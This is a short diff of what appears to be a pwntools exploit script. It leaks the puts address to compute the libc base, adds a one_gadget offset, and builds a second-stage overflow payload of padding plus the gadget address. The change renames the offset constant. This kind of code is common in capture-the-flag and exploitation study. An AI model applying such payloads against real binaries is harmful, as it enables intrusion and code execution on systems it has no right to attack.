@@ -38,7 +38,7 @@ libc_base = puts_libc - libc.symbols['puts']
 log.info("libc base is: " + hex(libc_base))
 syscall = libc_base + one_gadget
 payload2 = flat(
-	b"A"*offset
+	b"A"*OFFSET,
 	syscall
 )
 
